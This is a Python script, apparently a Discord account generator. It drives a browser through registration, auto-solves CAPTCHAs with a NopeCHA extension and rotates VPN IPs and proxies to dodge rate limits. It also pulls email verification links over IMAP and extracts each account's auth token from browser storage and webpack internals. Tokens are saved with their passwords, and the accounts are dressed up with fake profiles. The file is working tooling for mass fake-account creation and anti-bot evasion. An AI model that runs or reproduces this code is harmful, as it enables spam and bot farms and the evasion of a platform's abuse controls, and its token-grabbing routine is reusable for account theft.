    resp = session.get("https://discord.com/api/v9/users/@me", headers={"Authorization": token})
    if bool(resp.status_code == 200):
        data = resp.json()
        return (data.get("verified", False), data.get("email", "N/A"))
    return (None, None)


def save_account(email_addr: str, password: str, token: str, status: str):
    try:
        if bool(status == "VALID"):
            fname = "verified_tokens.txt"
        elif bool(status == "LOCKED"):
            fname = "locked_tokens.txt"
        else:
            fname = "invalid_tokens.txt"
        fpath = OUTPUT_DIR / fname
        with open(fpath, "a", encoding="utf-8") as f:
            f.write(f"""{email_addr}:{password}:{token}\n""")
        log.success(f"""Saved → {fname} [{status}]""")
        return None
    except Exception:
        e = None
        log.error(f"""Save error: {e}""")
        return None


def countdown_timer(duration: int):
    chars = ["⠋", "⠙", "⠹", "⠸", "⠼", "⠴", "⠦", "⠧", "⠇", "⠏"]
    for i in range(duration):
        frame = chars[i % len(chars)]
        sys.stdout.write(f"""\r\x1b[38;5;226m{frame}\x1b[0m \x1b[1;37mCooldown: {duration - i}s\x1b[0m   """)
        sys.stdout.flush()
        time.sleep(1)
        continue

    sys.stdout.write("\r                                        \r")
    sys.stdout.flush()


JS_UTILS = "\n(() => {\n    if (window.genUtils) return;\n    \n    // React-compatible input setter — uses the native HTMLInputElement setter\n    // which properly triggers React's synthetic onChange handler.\n    const nativeSetter = Object.getOwnPropertyDescriptor(\n        window.HTMLInputElement.prototype, 'value'\n    ).set;\n    \n    function setInput(selector, value) {\n        const el = document.querySelector(selector);\n        if (!el) return false;\n        // Focus the element first\n        el.focus();\n        // Use the native setter to bypass React's controlled input guard\n        nativeSetter.call(el, value);\n        // Fire events that React actually listens to\n        el.dispatchEvent(new Event('input', { bubbles: true }));\n        el.dispatchEvent(new Event('change', { bubbles: true }));\n        // Also fire React 16+ compatible events\n        el.dispatchEvent(new Event('blur', { bubbles: true }));\n        return true;\n    }\n    \n    function getInputValue(selector) {\n        const el = document.querySelector(selector);\n        return el ? el.value : '';\n    }\n    \n    function clickAllCheckboxes() {\n        const checkboxes = document.querySelectorAll('input[type=\"checkbox\"]');\n        let clicked = 0;\n        checkboxes.forEach(cb => {\n            if (!cb.checked) { cb.click(); cb.checked = true;\n                cb.dispatchEvent(new Event('change', { bubbles: true })); clicked++; }\n        });\n        return { clicked, total: checkboxes.length };\n    }\n    function setDropdown(label, value) {\n        const dropdown = document.querySelector(`div[role=\"button\"][aria-label=\"${label}\"]`);\n        if (!dropdown) return;\n        dropdown.click();\n        setTimeout(() => {\n            const options = document.querySelectorAll('div[role=\"option\"]');\n            const match = Array.from(options).find(opt => opt.textContent.trim() === value);\n            if (match) match.click();\n        }, 100);\n    }\n    function waitForDiscordToken(timeout = 5000) {\n        return new Promise((resolve) => {\n            const start = Date.now();\n            const check = () => {\n                const token = localStorage.getItem('token');\n                if (token) resolve(token.replace(/^\"|\"$/g, ''));\n                else if (Date.now() - start < timeout) setTimeout(check, 200);\n                else resolve(null);\n            };\n            check();\n        });\n    }\n    window.genUtils = { setInput, getInputValue, clickAllCheckboxes, setDropdown, waitForDiscordToken };\n})();\n"


async def _visual_click(tab, element):
    if not element:
        return False
    try:
        await tab.evaluate("""
            (el) => {
                el.scrollIntoView({behavior: 'smooth', block: 'center'});
                el.style.outline = '3px solid #ff00ff';
                setTimeout(() => { el.style.outline = ''; }, 500);
            }
        """, element)
        await asyncio.sleep(0.4)
        await element.mouse_click()
        return True
    except Exception:
        try:
            await element.click()
            return True
        except Exception:
            return False


async def _click_option(tab, text: str) -> bool:
    js = f'''\n        (async () => {{\n            let attempts = 0;\n            let lastText = "";\n            let stuckCount = 0;\n            while (attempts < 100) {{\n                const options = Array.from(document.querySelectorAll('div[class*="option"]'));\n                for (const opt of options) {{\n                    if (opt && opt.innerText && opt.innerText.trim().toLowerCase() === "{text.lower()}") {{\n                        opt.click();\n                        return true;\n                    }}\n                }}\n                \n                if (options.length > 0) {{\n                    let lastOpt = options[options.length - 1];\n                    let currentText = lastOpt.innerText || "";\n                    \n                    try {{\n                        lastOpt.scrollIntoView({{ behavior: 'smooth', block: 'end' }});\n                    }} catch(e) {{}}\n                    \n                    if (currentText === lastText) {{\n                        stuckCount++;\n                        if (stuckCount > 2) {{\n                            let p = lastOpt.parentElement;\n                            while(p && p !== document.body) {{\n                                if (p.scrollHeight > p.clientHeight && p.clientHeight > 0) {{\n                                    p.scrollTop += 200;\n                                }}\n                                p = p.parentElement;\n                            }}\n                        }}\n                    }} else {{\n                        stuckCount = 0;\n                    }}\n                    lastText = currentText;\n                }}\n                \n                await new Promise(r => setTimeout(r, 50));\n                attempts++;\n            }}\n            return false;\n        }})()\n    '''
    try:
        return await tab.evaluate(js, await_promise=True)
    except Exception:
        return False


async def fill_date_of_birth(page):
    months = ["January", "February", "March", "April", "May", "June", "July", "August", "September", "October", "November", "December"]
    day = str(random.randint(1, 28))
    month = random.choice(months)
    year = str(random.randint(1990, 2003))
    try:
        m_el = await page.select('div[aria-label="Month"]')
        await _visual_click(page, m_el)
        await asyncio.sleep(0.5)
        await _click_option(page, month)
        await asyncio.sleep(random.uniform(0.5, 1.0))
        d_el = await page.select('div[aria-label="Day"]')
        await _visual_click(page, d_el)
        await asyncio.sleep(0.5)
        await _click_option(page, day)
        await asyncio.sleep(random.uniform(0.5, 1.0))
        y_el = await page.select('div[aria-label="Year"]')
        await _visual_click(page, y_el)
        await asyncio.sleep(0.5)
        await _click_option(page, year)
        await asyncio.sleep(random.uniform(0.5, 1.0))
        log.success(f"""DOB set: {month} {day}, {year}""")
    except Exception as e:
        log.warning(f"""DOB fill error: {e}""")


async def fill_registration_form(page, email_addr: str, display_name: str, username: str, password: str) -> bool:
    try:
        log.info("Filling registration form...")
        fields = [('input[name="email"]', email_addr, "email"), ('input[name="global_name"]', display_name, "display name"), ('input[name="username"]', username, "username"), ('input[name="password"]', password, "password")]

        async def try_send_keys(selector, value, label):
            """Attempt 1: Native browser keystrokes (works when window is focused)."""
            try:
                el = await page.wait_for(selector, timeout=10000)
                await el.scroll_into_view()
                await asyncio.sleep(0.15)
                await el.click()
                await asyncio.sleep(random.uniform(0.1, 0.3))
                await el.send_keys(value)
                await asyncio.sleep(random.uniform(0.3, 0.5))
                return True
            except Exception as e:
                log.warning(f"{label} send_keys failed: {e}")
                return False

        async def force_js_set(selector, value, label):
            """Attempt 2: React-compatible JS injection using native setter."""
            try:
                safe_val = value.replace("\\", "\\\\").replace("'", "\\'")
                result = await page.evaluate(f"window.genUtils.setInput('{selector}', '{safe_val}')")
                await asyncio.sleep(0.3)
                return True
            except Exception as e:
                log.warning(f"{label} JS set failed: {e}")
                return False

        async def read_field(selector):
            """Read the current value of a field from the DOM."""
            try:
                val = await page.evaluate(f"window.genUtils.getInputValue('{selector}')")
                return val or ""
            except Exception:
                return ""

        for selector, value, label in fields:
            await try_send_keys(selector, value, label)
        await asyncio.sleep(0.5)
        await page.evaluate(JS_UTILS)
        for attempt in range(3):
            empty_fields = []
            for selector, value, label in fields:
                current_val = await read_field(selector)
                if current_val:
                    continue
                empty_fields.append((selector, value, label))
            if not empty_fields:
                break
            empty_labels = [f[2] for f in empty_fields]
            log.warning(f"Verification pass {attempt + 1}: Empty fields: {', '.join(empty_labels)}. Fixing via JS...")
            for selector, value, label in empty_fields:
                await force_js_set(selector, value, label)
            await asyncio.sleep(0.5)
            await page.evaluate(JS_UTILS)
        still_empty = []
        for selector, value, label in fields:
            current_val = await read_field(selector)
            if current_val:
                continue
            still_empty.append(label)
        if still_empty:
            log.error(f"Could not fill fields after 3 retries: {', '.join(still_empty)}")
            return False
        log.success("All form fields verified filled")
        await fill_date_of_birth(page)
        await asyncio.sleep(0.5)
        await page.evaluate(JS_UTILS)
        await asyncio.sleep(0.3)
        result = await page.evaluate("window.genUtils.clickAllCheckboxes()")
        if result and bool(result.get("clicked", 0) > 0):
            log.success(f"Checked {result.get('clicked')} checkbox(es)")
        await asyncio.sleep(0.5)
        for selector in ('button[type="submit"]',):
            btn = await page.query_selector(selector)
            if btn:
                await btn.click()
                log.success("Form submitted")
                return True
        ok = await page.evaluate("() => { const buttons = document.querySelectorAll('button'); for (const b of buttons) { const t = b.textContent || ''; if (t.includes('Continue') || t.includes('Create') || t.includes('Submit')) { b.click(); return true; } } return false; }")
        if ok:
            log.success("Form submitted (JS fallback)")
            return True
        log.error("Could not find submit button")
        return False
    except Exception:
        e = None
        log.error(f"""Form fill error: {e}""")
        return False


async def wait_for_account_creation(page, timeout: int=300) -> bool:
    log.warning("Solve CAPTCHA in the browser window...")
    start = time.time()
    last_url = ""
    for i in range(timeout * 10):
        try:
            current_url = await page.evaluate("window.location.href")
            if current_url != last_url:
                last_url = current_url
            if current_url and ("discord.com/channels/@me" in current_url or "channels/%40me" in current_url or "discord.com/channels/" in current_url):
                log.success("Account created!")
                return True
            if i > 50:
                if i % 50 == 0:
                    captcha_active = await page.evaluate("""() => { const iframes = document.querySelectorAll('iframe'); for (const frame of iframes) { if (frame.src.includes('hcaptcha') || frame.src.includes('recaptcha') || frame.src.includes('turnstile')) { if (frame.style.display !== 'none' && frame.style.visibility !== 'hidden') { return true; } } } return false; }""")
                    if not captcha_active:
                        clicked = await page.evaluate("""() => { const buttons = document.querySelectorAll('button'); for (const b of buttons) { const t = b.textContent || ''; if (t.includes('Continue') || t.includes('Create') || t.includes('Submit') || t.includes('Register')) { b.click(); return true; } } return false; }""")
                        if clicked:
                            sys.stdout.write("\r                                                            \r")
                            log.info("Clicked submit again (double CAPTCHA handling)...")
            if i % 50 == 0:
                elapsed = int(time.time() - start)
                sys.stdout.write(f"\r\x1b[38;5;240m[{datetime.now().strftime('%H:%M:%S')}]\x1b[0m \x1b[38;5;226m?\x1b[0m \x1b[1;37mWaiting for captcha... {elapsed}s\x1b[0m   ")
                sys.stdout.flush()
        except Exception:
            pass
        await asyncio.sleep(0.1)
    print()
    log.error("Timeout waiting for account creation")
    return False


async def safe_get(browser, url: str, max_retries: int=3):
    for attempt in range(max_retries):
        try:
            page = await browser.get(url)
            return page
        except (StopIteration, RuntimeError) as e:
            if attempt < max_retries - 1:
                log.warning(f"Navigation failed (attempt {attempt + 1}/{max_retries}), retrying...")
                await asyncio.sleep(2)
                continue
            log.error(f"Failed to reach {url}")
            raise


async def extract_token_from_browser(page) -> Optional[str]:
    log.info("Extracting token...")
    for _ in range(15):
        token = await page.evaluate("""
        (() => {
            const isToken = t => t && typeof t === 'string' && t.length > 50
                                  && t.includes('.') && t.split('.').length === 3;
            try {
                let t = window.localStorage.getItem('token');
                if (t) { t = t.replace(/"/g, ''); if (isToken(t)) return t; }
            } catch(e) {}
            try {
                const m = [];
                const chunk = window.webpackChunkdiscord_app || [];
                chunk.push([[''], {}, e => { for (let c in e.c) m.push(e.c[c]); }]);
                const auth = m.find(m => m?.exports?.default?.getToken !== void 0
                    && isToken(m.exports.default.getToken()));
                if (auth) return auth.exports.default.getToken();
            } catch(e) {}
            return null;
        })()
        """)
        if token and isinstance(token, str) and bool(len(token) > 50):
            return token
        await asyncio.sleep(2)
    return None


def get_brave_path() -> Optional[str]:
    """Get Brave browser executable path for all platforms"""
    system = platform.system()
    if bool(system == "Windows"):
        paths = ["C:\\Program Files\\BraveSoftware\\Brave-Browser\\Application\\brave.exe", "C:\\Program Files (x86)\\BraveSoftware\\Brave-Browser\\Application\\brave.exe", os.path.expanduser("~\\AppData\\Local\\BraveSoftware\\Brave-Browser\\Application\\brave.exe")]
    elif bool(system == "Darwin"):
        paths = ["/Applications/Brave Browser.app/Contents/MacOS/Brave Browser"]
    else:
        paths = ["/usr/bin/brave-browser", "/usr/bin/brave", "/snap/bin/brave"]

    for p in paths:
        if os.path.exists(p):
            return p


def setup_nopecha_extension_brave() -> Optional[str]:
    """Setup NopeCHA extension for Brave browser"""
    if ENABLE_NOPECHA:
        ext_path = None
        if NOPECHA_EXTENSION_PATH and os.path.exists(NOPECHA_EXTENSION_PATH):
            ext_path = str(NOPECHA_EXTENSION_PATH)

        if not ext_path and NOPECHA_EXT_DIR.exists() and (NOPECHA_EXT_DIR / "manifest.json").exists():
            ext_path = str(NOPECHA_EXT_DIR)

        if not ext_path:
            downloaded = download_nopecha_ext()
            if downloaded:
                ext_path = str(downloaded)

        if ext_path:
            current_key = get_current_nopecha_key()
            if current_key:
                keys = load_nopecha_keys()
                log.info(f"""NopeCHA key loaded (#{NOPECHA_KEY_INDEX + 1}/{len(keys)}): {current_key[:8]}...""")
            else:
                log.warning("No NopeCHA keys found in nopecha_keys.txt — CAPTCHAs may not auto-solve")
            log.success(f"""NopeCHA extension found for Brave: {ext_path}""")
            return ext_path
        log.warning("NopeCHA extension not found in Brave! Install it from Chrome Web Store first.")
        log.info("Extension ID: dknlfmjaanfblgfdfebhijalfmhmjjjo")
        log.info("To install in Brave:")
        log.info("1. Open Brave and go to chrome://extensions/")
        log.info("2. Enable Developer Mode (top right)")
        log.info("3. Visit: https://chrome.google.com/webstore/detail/nopecha-captcha-solver/dknlfmjaanfblgfdfebhijalfmhmjjjo")
        log.info("4. Click 'Add to Brave'")


BRAVE_PATH = get_brave_path()
NOPECHA_EXT = setup_nopecha_extension_brave()


def change_nordvpn_ip():
    """Automatically change the standard Windows NordVPN country"""
    countries = ["United States", "United Kingdom", "Canada", "Germany", "France", "Japan", "Australia", "Singapore", "Netherlands", "Sweden", "Switzerland", "Spain", "Italy", "Norway", "Denmark", "Belgium", "Ireland", "Brazil", "Mexico", "South Korea"]
    country = random.choice(countries)
    log.info(f"""Changing NordVPN IP to {country}...""")
    try:
        nordvpn_path = "C:\\Program Files\\NordVPN\\nordvpn.exe"
        if not os.path.exists(nordvpn_path):
            log.warning(f"""NordVPN CLI not found at {nordvpn_path}. Ensure it is installed.""")
            return None
        process = subprocess.run([nordvpn_path, "-c", "-g", country], capture_output=True, text=True)
        if bool(process.returncode == 0):
            log.success(f"""Successfully connected to {country} VPN""")
            time.sleep(3)
            return None

        if not process.stderr:
            process.stderr
        log.warning(f"""Failed to connect to NordVPN: {process.stderr}""")
    except Exception:
        e = None
        log.error(f"""NordVPN execution error: {e}""")
        return None


async def create_account(email_data: dict, account_num: int):
    browser = None
    profile_dir = None
    try:
        email_addr = email_data["email"]
        email_password = email_data["password"]
        imap_server = email_data["imap_server"]
        discord_password = email_password
        display_name = random_display_name()
        discord_user = random_username()
        log.success(f"""[{account_num}] Using email: {email_addr}""")
        if imap_server != "mail.mmails.shop":
            log.info(f"""IMAP Server: {imap_server}""")
        profile_dir = tempfile.mkdtemp(prefix="brave_gen_profile_")
        browser_args = [f"""--user-data-dir={profile_dir}""", "--no-first-run", "--disable-default-apps", "--disable-blink-features=AutomationControlled", "--disable-dev-shm-usage", "--no-sandbox"]
        if NOPECHA_EXT:
            current_key = get_current_nopecha_key()
            if current_key:
                log.info(f"""Using NopeCHA API key for this browser session: {current_key[:8]}...""")
            browser_args.append(f"""--load-extension={NOPECHA_EXT}""")
            log.info("NopeCHA extension loaded for Brave")
        else:
            log.warning("Running without NopeCHA - CAPTCHAs will need manual solving")
        if PROXY_SESSION:
            if MODE in ("proxy", "vpn"):
                proxy_arg = PROXY_SESSION
                if not proxy_arg.startswith(("http://", "https://", "socks5://")):
                    proxy_arg = f"""http://{proxy_arg}"""
                browser_args.append(f"""--proxy-server={proxy_arg}""")
                browser_args.append("--proxy-bypass-list=nopecha.com")
                log.info(f"""Using proxy: {proxy_arg}""")
        browser_kwargs = {"headless": False, "browser_args": browser_args}
        if BRAVE_PATH:
            browser_kwargs["browser_executable_path"] = BRAVE_PATH
            log.info("Using Brave browser with NopeCHA extension")
        browser = await uc.start(**browser_kwargs)
        await asyncio.sleep(3)
        if NOPECHA_EXT:
            current_key = get_current_nopecha_key()
            if current_key:
                log.info(f"""Injecting NopeCHA API Key: {current_key[:8]}...""")
                try:
                    await safe_get(browser, f"https://nopecha.com/setup#{current_key}")
                    await asyncio.sleep(2)
                except Exception as e:
                    log.warning(f"""Could not navigate to NopeCHA setup page: {e}""")
            else:
                log.info("Waiting for NopeCHA extension to initialize...")
                await asyncio.sleep(2)
        page = await safe_get(browser, "https://discord.com/register")
        page_loaded = False
        for _ in range(20):
            if await page.query_selector('input[name="email"]'):
                page_loaded = True
                break
            await asyncio.sleep(0.5)
        if not page_loaded:
            log.warning("Page load timeout \u2014 continuing anyway")
        await asyncio.sleep(0.5)
        success = await fill_registration_form(page, email_addr, display_name, discord_user, discord_password)
        if not success:
            log.error("Form fill failed")
            if browser:
                await browser.stop()
            if profile_dir and os.path.exists(profile_dir):
                shutil.rmtree(profile_dir, ignore_errors=True)
            rotate_nopecha_key()
            return (None, None)
        for _ in range(3):
            await page.mouse_click(random.randint(100, 800), random.randint(100, 600))
            await asyncio.sleep(random.uniform(0.05, 0.15))
        created = await wait_for_account_creation(page)
        if not created:
            log.error("Account creation failed")
            if browser:
                await browser.stop()
            if profile_dir and os.path.exists(profile_dir):
                shutil.rmtree(profile_dir, ignore_errors=True)
            rotate_nopecha_key()
            return (None, None)
        log.info("Extracting token from browser...")
        token = await extract_token_from_browser(page)
        if not token:
            log.info("Browser token not found, trying API login...")
            token = await fetch_token_api(email_addr, discord_password)
        if not token:
            log.error("Could not extract token")
            if browser:
                await browser.stop()
            if profile_dir and os.path.exists(profile_dir):
                shutil.rmtree(profile_dir, ignore_errors=True)
            rotate_nopecha_key()
            return (None, None)
        token = token.strip('"')
        log.success_kv("Token: ", token[:25] + "...")
        verified, _ = check_email_verified_api(token)
        if verified is not None:
            if not verified:
                log.info("Email not verified \u2014 fetching verification link...")
                imap_fetcher = IMAPMailApi(email_addr, email_password, imap_server)
                verify_url = imap_fetcher.get_verification_url(timeout=120)
                if verify_url:
                    log.success_kv("Verify link: ", verify_url[:50] + "...")
                    verify_page = await safe_get(browser, verify_url)
                    await asyncio.sleep(3)
                    log.warning("Solve verification captcha if prompted...")
                    max_wait = 120
                    elapsed = 0
                    while elapsed < max_wait:
                        await asyncio.sleep(5)
                        elapsed += 5
                        verified, _ = check_email_verified_api(token)
                        if verified:
                            log.success("Email verified!")
                            break
                        if elapsed % 15 == 0:
                            log.info(f"""Waiting for verification... ({elapsed}s)""")
                else:
                    log.warning("Verification link not found within timeout")
        status = check_token(token)
        log.success(f"""Token status: {status}""")
        save_account(email_addr, discord_password, token, status)
        if status == "VALID":
            log.info("Starting Inline Humanization...")
            bios = []
            if (BASE_DIR / "data/bios.txt").exists():
                with open(BASE_DIR / "data/bios.txt", "r", encoding="utf-8") as f:
                    bios = [l.strip() for l in f if l.strip() and not l.strip().startswith("#")]
            names = []
            if (BASE_DIR / "data/names.txt").exists():
                with open(BASE_DIR / "data/names.txt", "r", encoding="utf-8") as f:
                    names = [l.strip() for l in f if l.strip() and not l.strip().startswith("#")]
            pronouns_list = []
            if (BASE_DIR / "data/pronouns.txt").exists():
                with open(BASE_DIR / "data/pronouns.txt", "r", encoding="utf-8") as f:
                    pronouns_list = [l.strip() for l in f if l.strip() and not l.strip().startswith("#")]
            avatar_files = []
            if (BASE_DIR / "avatar").exists():
                avatar_files = load_avatar_files()
            humanizer = Humanizer(token, proxy_url=PROXY_SESSION if MODE in ("proxy", "vpn") else None)
            loop = asyncio.get_event_loop()
            success = await loop.run_in_executor(None, humanizer.process, names, bios, pronouns_list, avatar_files)
            if success:
                log.success("Inline Humanization completed successfully!")
            else:
                log.error("Inline Humanization encountered errors.")
            if browser:
                await browser.stop()
            if profile_dir and os.path.exists(profile_dir):
                shutil.rmtree(profile_dir, ignore_errors=True)
            rotate_nopecha_key()
            return (token, status)
        if browser:
            await browser.stop()
        if profile_dir and os.path.exists(profile_dir):
            shutil.rmtree(profile_dir, ignore_errors=True)
        rotate_nopecha_key()
        return (None, None)
    except Exception as e:
        log.error(f"""Account creation error: {e}""")
        if browser:
            try:
                await browser.stop()
            except Exception:
                pass
        if profile_dir and os.path.exists(profile_dir):
            shutil.rmtree(profile_dir, ignore_errors=True)
    if profile_dir and os.path.exists(profile_dir):
        shutil.rmtree(profile_dir, ignore_errors=True)
    rotate_nopecha_key()
    return (None, None)


async def fetch_token_api(email_addr: str, password: str) -> str:
    url = "https://discord.com/api/v9/auth/login"
    headers = {"accept": "*/*", "content-type": "application/json", "user-agent": "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36", "x-super-properties": "eyJvcyI6IldpbmRvd3MiLCJicm93c2VyIjoiQ2hyb21lIiwiZGV2aWNlIjoiIiwic3lzdGVtX2xvY2FsZSI6ImVuLVVTIiwiYnJvd3Nlcl91c2VyX2FnZW50IjoiTW96aWxsYS81LjAgKFdpbmRvd3MgTlQgMTAuMDsgV2luNjQ7IHg2NCkgQXBwbGVXZWJLaXQvNTM3LjM2IChLSFRNTCwgbGlrZSBHZWNrbykgQ2hyb21lLzEzNC4wLjAuMCBTYWZhcmkvNTM3LjM2IiwiYnJvd3Nlcl92ZXJzaW9uIjoiMTM0LjAuMC4wIiwib3NfdmVyc2lvbiI6IjEwIn0="}
    payload = {"login": email_addr, "password": password, "undelete": False, "login_source": None, "gift_code_sku_id": None}
    session = tls_client.Session(client_identifier="chrome_131", random_tls_extension_order=True)
    resp = session.post(url, headers=headers, json=payload)
    if bool(resp.status_code == 200):
        return resp.json().get("token", "")
    return ""


def select_mode():
    global MODE, AUTO_HUMANIZE
    print()
    log.info("Select Operation Mode:")
    print("  \x1b[38;5;44m[1]\x1b[0m \x1b[1;37mNormal Mode\x1b[0m - 120s cooldown")
    print("  \x1b[38;5;208m[2]\x1b[0m \x1b[1;37mProxy Mode\x1b[0m - 20s cooldown")
    print("  \x1b[38;5;46m[3]\x1b[0m \x1b[1;37mVPN Mode\x1b[0m - 30s cooldown")
    print()
    choice = input("  \x1b[38;5;226m?\x1b[0m \x1b[1;37mChoose mode (1/2/3): \x1b[0m").strip()
    if bool(choice == "1"):
        MODE = "normal"
        log.success("Normal Mode selected (120s cooldown)")
    elif bool(choice == "2"):
        MODE = "proxy"
        log.success("Proxy Mode selected (20s cooldown)")
    elif bool(choice == "3"):
        MODE = "vpn"
        log.success("VPN Mode selected (30s cooldown)")
    else:
        log.error("Invalid choice. Please enter 1, 2, or 3.")
    print()
    humanize_choice = input("  \x1b[38;5;226m?\x1b[0m \x1b[1;37mEnable auto-humanization? (Y/n): \x1b[0m").strip().lower()
    if bool(humanize_choice == "n"):
        AUTO_HUMANIZE = False
        log.warning("Auto-humanization DISABLED")
    else:
        AUTO_HUMANIZE = True
        log.success("Auto-humanization ENABLED (Sequential mode)")


async def main():
    global SESSION_TARGET, PROXY_SESSION, SESSION_CREATED, SESSION_STOP
    show_banner()
    if not BRAVE_PATH:
        log.error("Brave Browser not found. Please install Brave.")
        log.info("Download from: https://brave.com/")
        input("Press Enter to exit...")
        return None
    log.success(f"""Brave found at: {BRAVE_PATH}""")
    if ENABLE_NOPECHA and NOPECHA_EXT:
        log.success("NopeCHA extension loaded and ready for Brave")
    elif ENABLE_NOPECHA:
        log.warning("NopeCHA extension NOT loaded - CAPTCHAs will need manual solving")
        log.info("To install NopeCHA in Brave:")
        log.info("1. Open Brave and go to brave://extensions/")
        log.info("2. Enable Developer Mode (top right)")
        log.info("3. Visit: https://chrome.google.com/webstore/detail/nopecha-captcha-solver/dknlfmjaanfblgfdfebhijalfmhmjjjo")
        log.info("4. Click 'Add to Brave'")
        log.info("5. Run the script again after installation")
    email_pool = EmailPoolManager()
    if email_pool.get_remaining_count() == 0:
        log.error("No emails found in input/mails.txt!")
        log.info("Format each line as: email:password (uses default IMAP)")
        log.info("Or: email:password:imap_server (custom IMAP server)")
        log.info("Example lines:")
        log.info("  user1@gmail.com:pass123")
        log.info("  user2@outlook.com:pass456:imap-mail.outlook.com")
        input("Press Enter to exit...")
        return None
    log.success(f"""Available emails: {email_pool.get_remaining_count()}""")
    select_mode()
    ts = datetime.now().strftime("%H:%M:%S")
    try:
        raw = input(f"\x1b[38;5;240m[{ts}]\x1b[0m \x1b[38;5;226m?\x1b[0m \x1b[1;37mHow many accounts to generate (0 = unlimited, based on email pool): \x1b[0m")
        SESSION_TARGET = int(raw) if int(raw) > 0 else email_pool.get_remaining_count()
    except Exception:
        SESSION_TARGET = 1
    available = email_pool.get_remaining_count()
    if SESSION_TARGET > available:
        log.warning(f"""Requested {SESSION_TARGET} but only {available} emails available""")
        SESSION_TARGET = available
    if MODE in ("proxy", "vpn"):
        ts = datetime.now().strftime("%H:%M:%S")
        try:
            raw = input(f"\x1b[38;5;240m[{ts}]\x1b[0m \x1b[38;5;226m?\x1b[0m \x1b[1;37mProxy (leave blank to skip): \x1b[0m")
            PROXY_SESSION = raw.strip() if raw.strip() else None
            if PROXY_SESSION:
                log.success(f"""Proxy set: {PROXY_SESSION}""")
            else:
                log.warning("No proxy set - using direct connection")
        except Exception:
            PROXY_SESSION = None
    else:
        PROXY_SESSION = None
        log.info("Normal mode - no proxy required")
    print()
    log.info(f"""Target: {SESSION_TARGET} account(s)""")
    log.info(f"""Mode: {MODE.upper()} ({MODE_TIMINGS.get(MODE, 120)}s cooldown)""")
    log.info(f"""Auto-Humanization: {'ENABLED (Sequential)' if AUTO_HUMANIZE else 'DISABLED'}""")
    log.info(f"""NopeCHA Extension: {'ENABLED' if ENABLE_NOPECHA and NOPECHA_EXT else 'DISABLED'}""")
    print()
    SESSION_CREATED = 0
    SESSION_STOP = False
    new_valid_tokens = []
    try:
        while SESSION_CREATED < SESSION_TARGET and not SESSION_STOP:
            email_data = email_pool.get_email()
            if not email_data:
                log.warning("No more emails available in pool")
                break
            log.info("\n==================================================")
            log.info(f"""Creating account {SESSION_CREATED + 1}/{SESSION_TARGET}""")
            log.info("==================================================")
            token, status = await create_account(email_data, SESSION_CREATED + 1)
            if token and status == "VALID":
                SESSION_CREATED += 1
                new_valid_tokens.append(token)
                email_pool.mark_used(email_data)
            elif token:
                SESSION_CREATED += 1
                email_pool.mark_used(email_data)
                log.warning(f"""Account created but status is {status} \u2014 email consumed, moving on.""")
            else:
                email_data["attempts"] = email_data.get("attempts", 0) + 1
                if email_data["attempts"] >= 2:
                    log.error(f"""Failed twice to create account with {email_data['email']}. Discarding.""")
                    email_pool.mark_used(email_data)
                else:
                    log.warning(f"""Generation failed for {email_data['email']}. Will retry.""")
                    email_data["used"] = False
            if SESSION_CREATED < SESSION_TARGET and not SESSION_STOP:
                cooldown = MODE_TIMINGS.get(MODE, 120)
                if MODE == "vpn":
                    log.info("Rotating NordVPN IP during cooldown...")
                    change_nordvpn_ip()
                log.info(f"""Cooldown {cooldown}s before next account...""")
                countdown_timer(cooldown)
    except KeyboardInterrupt:
        log.warning("Stopped by user")
    print()
    log.success(f"""Generation complete \u2014 {SESSION_CREATED}/{SESSION_TARGET} account(s) created""")
    if AUTO_HUMANIZE and new_valid_tokens:
        run_batch_humanization(new_valid_tokens)
    elif not AUTO_HUMANIZE:
        log.info("Humanization skipped (disabled)")
    elif not new_valid_tokens:
        log.warning("No valid accounts created, skipping humanization")
    log.success(f"""Used emails moved to: {USED_DIR}/used_mails.txt""")
    log.success(f"""Output saved in: {OUTPUT_DIR}/""")
    return None


if bool(__name__ == "__main__"):
    if hasattr(sys.stdout, "reconfigure"):
        sys.stdout.reconfigure(encoding="utf-8")
    warnings.filterwarnings("ignore", category=ResourceWarning)
    uc.loop().run_until_complete(main())
